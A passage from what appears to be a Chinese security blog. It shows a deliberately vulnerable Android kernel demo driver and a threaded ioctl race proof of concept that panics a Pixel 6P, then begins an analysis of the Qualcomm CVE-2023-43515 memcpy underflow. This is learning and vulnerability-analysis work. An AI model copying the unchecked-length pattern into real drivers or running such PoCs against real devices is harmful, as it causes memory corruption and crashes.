snd_lsm_sound_model)</span><br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">snd_lsm_sound_model</span>&#123;<br><br>  <span class="hljs-type">char</span> *data;<br>  <span class="hljs-type">int</span> data_size;<br>  <span class="hljs-type">int</span> count;<br>&#125;;<br><br><span class="hljs-comment">//创建一个字符设备</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">char_dev</span><br>&#123;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">cdev</span> c_dev;<br>    <span class="hljs-type">dev_t</span> dev_no;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">1024</span>];<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">char</span> *write_temp;<br><span class="hljs-type">char</span> *arg_w1;  <span class="hljs-comment">// 全局变量</span><br><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title">my_open</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> inode *inode, <span class="hljs-keyword">struct</span> file *file)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printk</span>(KERN_INFO <span class="hljs-string">&quot;%s ttt_cdev open! -----------------\n&quot;</span>,__func__);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title">my_close</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> inode *ind, <span class="hljs-keyword">struct</span> file *fp)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printk</span>(<span class="hljs-string">&quot;demo release\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">ssize_t</span> <span class="hljs-title">my_write</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file,<span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *buf,<span class="hljs-type">size_t</span> len,<span class="hljs-type">loff_t</span> *pos)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">size_t</span> length;<br>    <span class="hljs-built_in">printk</span>(KERN_INFO <span class="hljs-string">&quot;%s :demo write &quot;</span>,__func__);<br><br>    <span class="hljs-keyword">if</span>(len&gt;<span class="hljs-number">64</span>)<br>       len = <span class="hljs-number">64</span>;<br>    length = <span class="hljs-built_in">strlen</span>(buf)+<span class="hljs-number">1</span>;<br><br>    write_temp = <span class="hljs-built_in">kmalloc</span>(length,GFP_KERNEL);<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">copy_from_user</span>(write_temp,buf,length))<br>        <span class="hljs-keyword">return</span> -EFAULT;<br>    <span class="hljs-built_in">printk</span>(KERN_INFO <span class="hljs-string">&quot;%s : my cdev write:%s \n&quot;</span>,__func__,write_temp);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">ssize_t</span> <span class="hljs-title">my_read</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file,<span class="hljs-type">char</span> __user *buf,<span class="hljs-type">size_t</span> len,<span class="hljs-type">loff_t</span> *pos)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printk</span>(KERN_INFO <span class="hljs-string">&quot;%s demo read data -----------\n&quot;</span>,__func__);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title">my_ioctl</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> rc = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">const</span> <span class="hljs-type">int</span> arg_r = <span class="hljs-number">9999</span>;<br><br>    <span class="hljs-type">void</span> __user *user_ptr = (<span class="hljs-type">void</span> __user *)arg;<br>    <span class="hljs-type">size_t</span> length;<br><br>    <span class="hljs-type">char</span> *str = <span class="hljs-string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">snd_lsm_sound_model</span> snd_model;<br><br>    <span class="hljs-built_in">printk</span>(KERN_INFO <span class="hljs-string">&quot;IOCTL cmd: %d \n&quot;</span>,cmd);<br>    <span class="hljs-keyword">switch</span>(cmd)&#123;<br>      <span class="hljs-keyword">case</span> IOC_CMD0:<br>         <span class="hljs-built_in">printk</span>(KERN_INFO <span class="hljs-string">&quot;IOC_CMD0: no argument.\n&quot;</span>);<br>         rc = <span class="hljs-number">0</span>;<br>         <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> IOC_CMD1:<br>         <span class="hljs-built_in">printk</span>(KERN_INFO <span class="hljs-string">&quot;IOC_CMD1 : ioc read argument : %d \n&quot;</span>,arg_r);<br>         arg = arg_r;<br>         rc =<span class="hljs-number">1</span>;<br>         <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> IOC_CMD2:<br>         <span class="hljs-built_in">printk</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>         <span class="hljs-built_in">printk</span>(<span class="hljs-string">&quot;------------start-------------------&quot;</span>);<br>         <span class="hljs-keyword">if</span>(<span class="hljs-built_in">copy_from_user</span>(&amp;snd_model, user_ptr, <span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">struct</span> snd_lsm_sound_model)))&#123;<br>             <span class="hljs-built_in">printk</span>(KERN_INFO <span class="hljs-string">&quot;IOC_CMD2: copy from user failed \n&quot;</span>);<br>             <span class="hljs-keyword">return</span> -EFAULT;<br>         &#125;<br>         <span class="hljs-built_in">printk</span>(KERN_INFO <span class="hljs-string">&quot;IOC_CMD2: snd_model %d size %d  and the str_len: %d\n&quot;</span>,snd_model.count,snd_model.data_size,<span class="hljs-built_in">strlen</span>(str));<br><br>         length = snd_model.data_size+<span class="hljs-number">1</span>;<br><br>         arg_w1 = <span class="hljs-built_in">kmalloc</span>(re,GFP_KERNEL);<br><br>         <span class="hljs-keyword">if</span>(length<span class="hljs-number">-1</span> != snd_model.data_size)&#123;<br>               <span class="hljs-built_in">printk</span>(KERN_INFO <span class="hljs-string">&quot;IOC_cmd___2 error data : %d&quot;</span>,snd_model.data_size);<br>               <span class="hljs-keyword">break</span>;<br>         &#125;<br>         <span class="hljs-built_in">memcpy</span>(arg_w1, str, snd_model.data_size);<br><br>         <span class="hljs-built_in">printk</span>(KERN_INFO <span class="hljs-string">&quot;IOC_cmd2 get arg_w1 : %s&quot;</span>,arg_w1);<br><br>         <span class="hljs-built_in">kfree</span>(arg_w1);<br>         <span class="hljs-built_in">printk</span>(<span class="hljs-string">&quot;------------end-------------------\n&quot;</span>);<br>         rc =<span class="hljs-number">2</span>;<br>         <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">default</span>:<br>         <span class="hljs-built_in">printk</span>(<span class="hljs-string">&quot;my ioctl error!\n&quot;</span>);<br>         <span class="hljs-keyword">return</span> -EFAULT;<br>    &#125;<br>    <span class="hljs-keyword">return</span> rc;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">file_operations</span> my_fops=&#123;<br>  .open = my_open,<br>  .read = my_read,<br>  .write = my_write,<br>  .unlocked_ioctl = my_ioctl,<br>  .release = my_close,<br>&#125;;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">char_dev</span> *my_dev;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">class</span> *cls;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">device</span> *my_device;<br><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">int</span> __init <span class="hljs-title">hello_world_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> </span>&#123;<br><br>    <span class="hljs-type">int</span> ret;<br>    <span class="hljs-built_in">printk</span>(KERN_INFO <span class="hljs-string">&quot;Helloworld!\n&quot;</span>);<br><br>    my_dev = <span class="hljs-built_in">kmalloc</span>(<span class="hljs-built_in">sizeof</span>(*my_dev),GFP_KERNEL);<br>    <span class="hljs-keyword">if</span>(!my_dev)<br>    &#123;<br>        ret = -ENOMEM;<br>        <span class="hljs-keyword">goto</span> malloc_dev_fair;<br>    &#125;<br>    ret = <span class="hljs-built_in">alloc_chrdev_region</span>(&amp;my_dev-&gt;dev_no,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-string">&quot;tttt_dev&quot;</span>);<br>    <span class="hljs-keyword">if</span>(ret &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-keyword">goto</span> alloc_chrdev_fair;<br>    &#125;<br>    <span class="hljs-built_in">cdev_init</span>(&amp;my_dev-&gt;c_dev,&amp;my_fops);<br>    ret = <span class="hljs-built_in">cdev_add</span>(&amp;my_dev-&gt;c_dev,my_dev-&gt;dev_no,<span class="hljs-number">1</span>);<br><br>    cls = <span class="hljs-built_in">class_create</span>(THIS_MODULE, <span class="hljs-string">&quot;myclass&quot;</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">IS_ERR</span>(cls))<br>    &#123;<br>        <span class="hljs-built_in">unregister_chrdev_region</span>(my_dev-&gt;dev_no,<span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">return</span> -EBUSY;<br>    &#125;<br><br>    my_device = <span class="hljs-built_in">device_create</span>(cls,<span class="hljs-literal">NULL</span>,my_dev-&gt;dev_no,<span class="hljs-literal">NULL</span>,<span class="hljs-string">&quot;tttt_dev&quot;</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">IS_ERR</span>(my_device))<br>    &#123;<br>        <span class="hljs-built_in">class_destroy</span>(cls);<br>        <span class="hljs-built_in">unregister_chrdev_region</span>(my_dev-&gt;dev_no,<span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">return</span> -EBUSY;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>malloc_dev_fair:<br>    <span class="hljs-keyword">return</span> ret;<br>alloc_chrdev_fair:<br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> __exit <span class="hljs-title">hello_world_exit</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> </span>&#123;<br>    <span class="hljs-comment">//删除设备</span><br>    <span class="hljs-comment">//cdev_del(&amp;my_dev-&gt;c_dev);</span><br>    <span class="hljs-built_in">device_destroy</span>(cls, my_dev-&gt;dev_no);<br>    <span class="hljs-built_in">class_destroy</span>(cls);<br>    <span class="hljs-comment">//注销驱动——&gt;后面写1表示从dev_on开始连续一个</span><br>    <span class="hljs-built_in">unregister_chrdev_region</span>(my_dev-&gt;dev_no,<span class="hljs-number">1</span>);<br>    <span class="hljs-built_in">kfree</span>(my_dev);<br>    <span class="hljs-built_in">printk</span>(KERN_ALERT <span class="hljs-string">&quot;Goodbye, World!\n&quot;</span>);<br>&#125;<br><br><span class="hljs-built_in">module_init</span>(hello_world_init);<br><span class="hljs-built_in">module_exit</span>(hello_world_exit);<br><br><span class="hljs-built_in">MODULE_LICENSE</span>(<span class="hljs-string">&quot;Dual BSD/GPL&quot;</span>);<br><span class="hljs-built_in">MODULE_AUTHOR</span>(<span class="hljs-string">&quot;Your Name&quot;</span>);<br><span class="hljs-built_in">MODULE_DESCRIPTION</span>(<span class="hljs-string">&quot;Hello, World! Driver&quot;</span>);<br><span class="hljs-built_in">MODULE_VERSION</span>(<span class="hljs-string">&quot;1.0&quot;</span>);<br></code></pre></td></tr></table></figure><p>使用android 内核编译环境编译成驱动模块(详细步骤见 <a href="25__Pixel6P_Android%E9%A9%B1%E5%8A%A8%E6%A8%A1%E5%9D%97%E7%BC%96%E8%AF%91.md">https://tig3rhu.github.io/2024/03/28/25__Pixel6P_Android%E9%A9%B1%E5%8A%A8%E6%A8%A1%E5%9D%97%E7%BC%96%E8%AF%91&#x2F;</a>)，上传到手机中，然后进行加载。这里要注意的是，android的编译链跟Linux 编译的make 是不一样的，至少对代码的质量要高一些，比如未使用的变量，定义的局部变量不允许放在代码中间、以及不允许变量声明和代码混合等规则，在标准的C语言中是不允许的，但Linux 使用的是C99 标准拓展支持这些问题。<br>比如此类问题：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">error: mixing declarations <span class="hljs-keyword">and</span> code <span class="hljs-keyword">is</span> a C99 <span class="hljs-keyword">extension</span> [-Werror,-Wdeclaration-<span class="hljs-keyword">after</span>-<span class="hljs-keyword">statement</span>] <span class="hljs-type">int</span> rc = <span class="hljs-number">0</span>;<br>变量声明需要在开头: error: mixing declarations <span class="hljs-keyword">and</span> code <span class="hljs-keyword">is</span> a C99 <span class="hljs-keyword">extension</span> [-Werror,-Wdeclaration-<span class="hljs-keyword">after</span>-<span class="hljs-keyword">statement</span>] <span class="hljs-type">int</span> ret;<br>声明和代码不能混合:  error: mixing declarations <span class="hljs-keyword">and</span> code <span class="hljs-keyword">is</span> a C99 <span class="hljs-keyword">extension</span> [-Werror,-Wdeclaration-<span class="hljs-keyword">after</span>-<span class="hljs-keyword">statement</span>] size_t length = snd_model.data_size+<span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p>然后将编译出来的驱动加载到pixel 6P 内。<img src="/56__%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E5%AD%A6%E4%B9%A0%E4%B9%8BCVE-2017-7368%E5%A4%8D%E7%8E%B0.assets/image-20240505163252082.png"><br>如果编译出来的驱动加载到手机中，手机死机的情况就是驱动的问题，那么就要排查一些代码。</p><p>然后开始写POC 代码: </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IOC_MAGIC <span class="hljs-string">&#x27;a&#x27;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IOC_CMD0 _IO(IOC_MAGIC,0)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IOC_CMD1 _IOR(IOC_MAGIC,1,int)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IOC_CMD2 _IOW(IOC_MAGIC, 2, struct snd_lsm_sound_model)</span><br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">snd_lsm_sound_model</span>&#123;<br>  <span class="hljs-type">char</span> *data;<br>  <span class="hljs-type">int</span> data_size;<br>  <span class="hljs-type">int</span> count;<br>&#125;;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">snd_lsm_sound_model</span> snd_model_1;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">snd_lsm_sound_model</span> snd_model_2;<br><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span>* <span class="hljs-title">threadA</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span></span>&#123;<br>   <span class="hljs-type">int</span> fd = *(<span class="hljs-type">int</span> *)arg;<br>   <span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;<br>   <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;threadA start&quot;</span>);<br><br>   <span class="hljs-keyword">while</span>(i&lt;<span class="hljs-number">10</span>)&#123;<br>     <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;thread = 1 \n&quot;</span>);<br><br>     <span class="hljs-built_in">ioctl</span>(fd, IOC_CMD2, &amp;snd_model_1);<br><br>   &#125;<br>   <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;threadA deid\n&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span>* <span class="hljs-title">threadB</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span></span>&#123;<br>  <span class="hljs-type">int</span> fd = *(<span class="hljs-type">int</span> *)arg;<br>  <span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;thread = 2 \n&quot;</span>);<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;threadB start&quot;</span>);<br><br>  <span class="hljs-keyword">while</span>(i&lt;<span class="hljs-number">10</span>)&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;thread = 222 \n&quot;</span>);<br><br>    <span class="hljs-built_in">ioctl</span>(fd, IOC_CMD2, &amp;snd_model_2);<br><br>  &#125;<br> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;threadB died\n&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> cmd;<br>    <span class="hljs-type">int</span> rc;<br><br>    <span class="hljs-type">char</span> *temp;<br>    <span class="hljs-type">int</span> arg_r;<br>    <span class="hljs-type">int</span> fd = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/dev/tttt_dev&quot;</span>, O_RDWR);<br>    <span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>)&#123;<br>       <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;open file failed !\n&quot;</span>);<br>       <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-built_in">read</span>(fd,temp,<span class="hljs-built_in">sizeof</span>(temp));<br><br>    rc = <span class="hljs-built_in">ioctl</span>(fd,IOC_CMD0);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;rc = %d \n&quot;</span>,rc);<br><br>    rc = <span class="hljs-built_in">ioctl</span>(fd,IOC_CMD1,arg_r);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;rc = %d  arg_r : %d \n&quot;</span>,rc, arg_r);<br><br>    snd_model_1.data = <span class="hljs-string">&quot;11111&quot;</span>;<br>    snd_model_1.data_size = <span class="hljs-number">10</span>;<br>    snd_model_1.count = <span class="hljs-number">11</span>;<br><br>    snd_model_2.data = <span class="hljs-string">&quot;2222&quot;</span>;<br>    snd_model_2.data_size = <span class="hljs-number">500</span>;<br>    snd_model_2.count = <span class="hljs-number">22</span>;<br><br>    <span class="hljs-type">pthread_t</span> thread1,thread2;<br><br>    <span class="hljs-built_in">pthread_create</span>(&amp;thread1,<span class="hljs-literal">NULL</span>,threadA, &amp;fd);<br>    <span class="hljs-built_in">pthread_create</span>(&amp;thread2,<span class="hljs-literal">NULL</span>,threadB, &amp;fd);<br><br>    <span class="hljs-built_in">pthread_join</span>(thread1, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-built_in">pthread_join</span>(thread2, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-built_in">close</span>(fd);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br> &#125;<br></code></pre></td></tr></table></figure><p>编译poc，编译链用谷歌官方的编译链，从这里下载 <a href="https://developer.android.google.cn/ndk/downloads?hl=en%EF%BC%8C">https://developer.android.google.cn/ndk/downloads?hl=en，</a> 然后确定手机系统使用的是那个Android API，可以在手机内执行 getprop ro.build.version.sdk查看。</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@4cd0e87f2387</span><span class="hljs-symbol">:~/aosp/test_ndk_driver/android-ndk-r26c/toolchains/llvm/prebuilt/linux-x86_64/bin</span><span class="hljs-comment"># ./aarch64-linux-android33-clang /root/aosp/</span><br>test_ndk_driver/android_helloworld22_poc.c -o /root/aosp/test_ndk_driver/android_helloworld22_poc<br></code></pre></td></tr></table></figure><p>之后执行文件，就可以触发条件竞争漏洞了，pixel 6P 会触发内核问题，系统会进入到panic状态，进而系统自动重启。</p><p><img src="/56__%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E5%AD%A6%E4%B9%A0%E4%B9%8BCVE-2017-7368%E5%A4%8D%E7%8E%B0.assets/image-20240412151231405.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Qualcomm Securitybulletin CVE-2023-43515 漏洞分析</title>
    <link href="/2024/04/27/74__%E9%AB%98%E9%80%9ACVE-2023-43515%E5%88%86%E6%9E%90/"/>
    <url>/2024/04/27/74__%E9%AB%98%E9%80%9ACVE-2023-43515%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>高通漏洞2024年4月份公告中披露对 CVE-2023-43515 漏洞修复的情况<br><a href="https://docs.qualcomm.com/product/publicresources/securitybulletin/april-2024-bulletin.html#_cve-2023-43515">https://docs.qualcomm.com/product/publicresources/securitybulletin/april-2024-bulletin.html#_cve-2023-43515</a><br>根据漏洞披露信息来看，了解到这是一个不检查出入大小，导致缓冲区溢出的漏洞，漏洞存在于tmecom驱动模块中。</p><p>首先查看修复的情况,， 可以看到这里对 tdev-&gt;pkt.size  的带大小做了限制，这个值要小于TMECOM_RX_HDR_SIZE，才会执行后面的tmecom_decode() 函数。<br><img src="/74__%E9%AB%98%E9%80%9ACVE-2023-43515%E5%88%86%E6%9E%90.assets/image-20240425223630043.png"></p><p>因此来查看tmecom_decode() 函数的代码，函数最有可能导致缓冲区溢出的是memcpy 函数，那么复制的字节len 大小是 (tdev-&gt;pkt.size - TMECOM_RX_HDR_SIZE) 计算的值，前面修复的情况是tdev-&gt;pkt.size &lt;&#x3D; TMECOM_RX_HDR_SIZE，那么就错误，因此如果 tdev-&gt;pkt.size 的值小于 TMECOM_RX_HDR_SIZE 这这个值，那 len 就为负数，memcpy 中的len 参数是一个无符号整性，为负数的len向下溢出 会被强制转换为一个很大的正数，进而导致 rbuf 的缓冲区溢出。<br> <figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">size_t</span> <span class="hljs-title">tmecom_decode</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> tmecom *tdev, <span class="hljs-type">void</span> *respbuf)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *msg = tdev-&gt;pkt.data + TMECOM_RX_HDR_SIZE;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *rbuf = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *)respbuf;<br><br><span class="hljs-built_in">memcpy</span>(rbuf, msg, (tdev-&gt;pkt.size - TMECOM_RX_HDR_SIZE));<br><span class="hljs-keyword">return</span> (tdev-&gt;pkt.size - TMECOM_RX_HDR_SIZE);<br>&#125;<br></code></pre></td></tr></table></figure></p><p>那么这里的 TMECOM_RX_HDR_SIZE 值是多大呢？ </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">tmecom_msg_hdr</span> &#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> reserved; <span class="hljs-comment">/* for future use */</span>  <span class="hljs-comment">// start address 0 </span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> txnid;    <span class="hljs-comment">/* transaction id */</span>  <span class="hljs-comment">//  start address 4</span><br>&#125; __packed;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TMECOM_TX_HDR_SIZE sizeof(struct tmecom_msg_hdr)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CBOR_NUM_BYTES (sizeof(unsigned int))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TMECOM_RX_HDR_SIZE (TMECOM_TX_HDR_SIZE + CBOR_NUM_BYTES)</span><br></code></pre></td></tr></table></figure><p>找到这个宏定义的地方，可以看到 TMECOM_RX_HDR_SIZE &#x3D;  TMECOM_TX_HDR_SIZE + CBOR_NUM_BYTES</p><ul><li>TMECOM_TX_HDR_SIZE 的大小是 结构体tmecom_msg_hdr的sizeof 的值，也就是 4 字节。</li><li>CBOR_NUM_BYTES 的值是一个无符号整型，也是 4 字节。<br>因而 TMECOM_RX_HDR_SIZE 的值为 8字节。</li></ul><p>由于要确定 